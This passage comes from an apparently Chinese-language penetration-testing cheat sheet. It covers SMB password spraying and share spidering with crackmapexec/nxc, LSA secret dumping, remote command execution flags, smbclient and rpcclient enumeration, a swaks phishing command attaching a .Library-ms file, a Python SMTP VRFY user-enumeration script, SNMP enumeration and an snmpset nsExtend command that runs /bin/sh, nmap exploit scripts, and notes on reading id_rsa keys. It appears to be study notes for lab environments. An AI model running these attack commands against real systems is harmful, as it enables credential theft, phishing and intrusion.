</span></span><span class="line"><span class="cl">/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span></code></pre></td></tr></table></div>
</div>
</div><h3 id="smb共享"><a href="#smb共享" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>smb..共享</h3>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -v -p 139,445 --script smb-os-discovery 192.168.50.152
</span></span><span class="line"><span class="cl"><span class="c1">## 破解   用户在目标有管理员权限会提示pwn3d</span>
</span></span><span class="line"><span class="cl">crackmapexec smb 192.168.50.242-243 -u usernames.txt -p passwords.txt --continue-on-success
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">proxychains -q crackmapexec smb 172.16.6.240-241 172.16.6.254 -u john -d beyond.com -p <span class="s2">&#34;dqsTwTpZPn#nL&#34;</span> --shares
</span></span><span class="line"><span class="cl"><span class="c1">## 共享</span>
</span></span><span class="line"><span class="cl">crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share <span class="s1">&#39;xxxxx&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1">## 下到本机 不好用 建议用smbclient下载</span>
</span></span><span class="line"><span class="cl">nxc smb  192.168.217.248 -u postmaster -p postmaster  -M spider_plus -o <span class="nv">READ_ONLY</span><span class="o">=</span><span class="nb">false</span>
</span></span><span class="line"><span class="cl">		--lsa                      <span class="c1">###Dumping LSA secrets</span>
</span></span><span class="line"><span class="cl">		--gen-relay-list asd.txt   <span class="c1">###不需要SMB签名的主机</span>
</span></span><span class="line"><span class="cl">		--pass-pol                 <span class="c1">###域密码策略</span>
</span></span><span class="line"><span class="cl">		--no-bruteforce            <span class="c1">###无需爆破</span>
</span></span><span class="line"><span class="cl">		-M spider_plus             <span class="c1">###所有可读文件</span>
</span></span><span class="line"><span class="cl">		--put-file /tmp/users C:<span class="se">\\</span>whoami.txt
</span></span><span class="line"><span class="cl">		--get-file C:<span class="se">\\</span>Windows<span class="se">\\</span>whoami.txt /tmp/file
</span></span><span class="line"><span class="cl">		--local-auth               <span class="c1">###本地认证</span>
</span></span><span class="line"><span class="cl">		--port 
</span></span><span class="line"><span class="cl">		--exec-method  wmiexec/atexec/smbexec###执行命令的方式
</span></span><span class="line"><span class="cl">		-x                         <span class="c1">###cmd</span>
</span></span><span class="line"><span class="cl">		-X                         <span class="c1">###powershell  </span>
</span></span><span class="line"><span class="cl">		--shares 
</span></span><span class="line"><span class="cl">		--share <span class="s1">&#39;C$&#39;</span>
</span></span><span class="line"><span class="cl">	winrm 
</span></span><span class="line"><span class="cl">		-d DOMAINName              <span class="c1">###不使用smb连接</span>
</span></span><span class="line"><span class="cl">		-X                         <span class="c1">###执行命令</span>
</span></span><span class="line"><span class="cl">	mssql 
</span></span><span class="line"><span class="cl">		-M mssql_priv              <span class="c1">###提权 </span>
</span></span><span class="line"><span class="cl">		-q <span class="s1">&#39;SELECT name FROM master.dbo.sysdatabases;&#39;</span>
</span></span><span class="line"><span class="cl">		用msdat
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## 枚举信息</span>
</span></span><span class="line"><span class="cl">	enum4linux -a ip
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	smbclient
</span></span><span class="line"><span class="cl"><span class="c1">### 列出所有共享</span>
</span></span><span class="line"><span class="cl">smbclient -p <span class="m">4455</span> -L //192.168.250.242/ -U johhr_admin --password <span class="s1">&#39;dqsTwTpZPn&#39;</span>
</span></span><span class="line"><span class="cl">smbclient -p <span class="m">4455</span> -L //192.168.250.242/ -U <span class="s1">&#39;relia\jim&#39;</span> --password <span class="s1">&#39;dqsTwTpZ&#39;</span>  <span class="c1">###域用户认证</span>
</span></span><span class="line"><span class="cl">crackmapexec smb 192.168.250.242 -u john -p <span class="s2">&#34;dqsTwTpZPn#nL&#34;</span> --shares
</span></span><span class="line"><span class="cl"><span class="c1">### 访问指定共享 ls get 用双引号</span>
</span></span><span class="line"><span class="cl">	smbclient -p <span class="m">4455</span>  //192.168.215.63/Scripts -U hr_admin --password Welcome1234 
</span></span><span class="line"><span class="cl">	get <span class="s2">&#34;xx&#34;</span>  下载文件
</span></span><span class="line"><span class="cl">	put ./xxx  /xx/xx/xxx <span class="c1">##先到想要的目录下 </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">### smbmap </span>
</span></span><span class="line"><span class="cl">	smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
</span></span><span class="line"><span class="cl">	smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R <span class="s1">&#39;Department Shares&#39;</span> --dir-only
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">### rpcclient</span>
</span></span><span class="line"><span class="cl">	rpcclient -U <span class="s2">&#34;&#34;</span> -N 172.16.5.5
</span></span><span class="line"><span class="cl">	&gt; enumdomusers
</span></span></code></pre></td></tr></table></div>
</div>
</div><h3 id="smtp"><a href="#smtp" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>SMTP</h3>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">### swaks</span>
</span></span><span class="line"><span class="cl">	sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.225.242 --body @body.txt --header <span class="s2">&#34;Subject: Staging Script&#34;</span> --suppress-data -ap
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl"><span class="c1">### 25 smtp discovery</span>
</span></span><span class="line"><span class="cl">	nmap -v -p <span class="m">25</span> --script smb-os-discovery.nse -iL smtpip <span class="p">|</span> grep open 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">### 用户是否存在探测</span>
</span></span><span class="line"><span class="cl">	nc -nv 192.168.248.189 <span class="m">25</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">### 自动探测用户是否存在python3 smtp.py root 192.168.50.8</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#!/usr/bin/python</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">import socket
</span></span><span class="line"><span class="cl">import sys
</span></span><span class="line"><span class="cl"><span class="k">if</span> len<span class="o">(</span>sys.argv<span class="o">)</span> !<span class="o">=</span> 3:
</span></span><span class="line"><span class="cl">        print<span class="o">(</span><span class="s2">&#34;Usage: vrfy.py &lt;username&gt; &lt;target_ip&gt;&#34;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">        sys.exit<span class="o">(</span>0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Create a Socket</span>
</span></span><span class="line"><span class="cl"><span class="nv">s</span> <span class="o">=</span> socket.socket<span class="o">(</span>socket.AF_INET, socket.SOCK_STREAM<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Connect to the Server</span>
</span></span><span class="line"><span class="cl"><span class="nv">ip</span> <span class="o">=</span> sys.argv<span class="o">[</span>2<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">connect</span> <span class="o">=</span> s.connect<span class="o">((</span>ip,25<span class="o">))</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Receive the banner</span>
</span></span><span class="line"><span class="cl"><span class="nv">banner</span> <span class="o">=</span> s.recv<span class="o">(</span>1024<span class="o">)</span>
</span></span><span class="line"><span class="cl">print<span class="o">(</span>banner<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># VRFY a user</span>
</span></span><span class="line"><span class="cl"><span class="nv">user</span> <span class="o">=</span> <span class="o">(</span>sys.argv<span class="o">[</span>1<span class="o">])</span>.encode<span class="o">()</span>
</span></span><span class="line"><span class="cl">s.send<span class="o">(</span>b<span class="s1">&#39;VRFY &#39;</span> + user + b<span class="s1">&#39;\r\n&#39;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">result</span> <span class="o">=</span> s.recv<span class="o">(</span>1024<span class="o">)</span>
</span></span><span class="line"><span class="cl">print<span class="o">(</span>result<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Close the socket</span>
</span></span><span class="line"><span class="cl">s.close<span class="o">()</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><h3 id="snmp"><a href="#snmp" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>SNMP</h3>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## SNMP服务</span>
</span></span><span class="line"><span class="cl">	sudo nmap -sU --open -p <span class="m">161</span> 192.168.229.149 -oG open-snmp.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## 列出当前tcp监听端口</span>
</span></span><span class="line"><span class="cl">	snmpwalk -c public -v1 192.168.229.149 1.3.6.1.2.1.6.13.1.3
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## 当前进程</span>
</span></span><span class="line"><span class="cl">	snmpwalk -c public -v1 192.168.229.149 1.3.6.1.2.1.25.4.2.1.2
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## 用户</span>
</span></span><span class="line"><span class="cl">	snmpwalk -c public -v1 192.168.229.149 1.3.6.1.4.1.77.1.2.25
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># #安装的软件</span>
</span></span><span class="line"><span class="cl">	snmpwalk -c public -v1 192.168.229.149 1.3.6.1.2.1.25.6.3.1.2
</span></span><span class="line"><span class="cl"><span class="c1">## 已经执行的命令</span>
</span></span><span class="line"><span class="cl">	snmpwalk -v2c -c public 192.168.229.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">snmpwalk -c public -v1 192.168.229.149  1.3.6.1.2.1.6.13.1.3
</span></span><span class="line"><span class="cl"><span class="p">|</span>1.3.6.1.2.1.25.1.6.0<span class="p">|</span>System Processes<span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>1.3.6.1.2.1.25.4.2.1.2<span class="p">|</span>Running Programs<span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>1.3.6.1.2.1.25.4.2.1.4<span class="p">|</span>Processes Path<span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>1.3.6.1.2.1.25.2.3.1.4<span class="p">|</span>Storage Units<span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>1.3.6.1.2.1.25.6.3.1.2<span class="p">|</span>Software Name<span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>1.3.6.1.4.1.77.1.2.25<span class="p">|</span>User Accounts<span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>1.3.6.1.2.1.6.13.1.3<span class="p">|</span>TCP Local Ports<span class="p">|</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## 执行命令</span>
</span></span><span class="line"><span class="cl">	https://book.hacktricks.xyz/v/cn/network-services-pentesting/pentesting-snmp/snmp-rce
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	kali&gt; snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 192.168.229.149  <span class="s1">&#39;nsExtendStatus.&#34;evilcommand&#34;&#39;</span> <span class="o">=</span> createAndGo  <span class="s1">&#39;nsExtendCommand.&#34;evilcommand&#34;&#39;</span> <span class="o">=</span> /bin/sh  <span class="s1">&#39;nsExtendArgs.&#34;evilcommand&#34;&#39;</span> <span class="o">=</span> <span class="s1">&#39;whoami&#39;</span>
</span></span><span class="line"><span class="cl">	kali&gt; snmpwalk -v2c -c public 192.168.229.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
</span></span></code></pre></td></tr></table></div>
</div>
</div><h2 id="漏洞扫描"><a href="#漏洞扫描" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>漏洞扫描</h2>
<h3 id="nessus"><a href="#nessus" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>nessus</h3>
<pre tabindex="0"><code></code></pre><h3 id="nmap-1"><a href="#nmap-1" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>nmap</h3>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -sV -p <span class="m">443</span> --script <span class="s2">&#34;vuln&#34;</span> 192.168.50.124
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">nmap -sV --script <span class="s2">&#34;exploit&#34;</span> 192.168.242.10
</span></span><span class="line"><span class="cl">nmap -v -p 139,445 --script<span class="o">=</span>smb-os-discovery 10.11.1.227
</span></span></code></pre></td></tr></table></div>
</div>
</div><h2 id="常见漏洞"><a href="#常见漏洞" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>常见漏洞</h2>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">xss
</span></span><span class="line"><span class="cl">	提权管理员
</span></span><span class="line"><span class="cl">目录遍历
</span></span><span class="line"><span class="cl">	读用户
</span></span><span class="line"><span class="cl">	读id_rsa 私钥
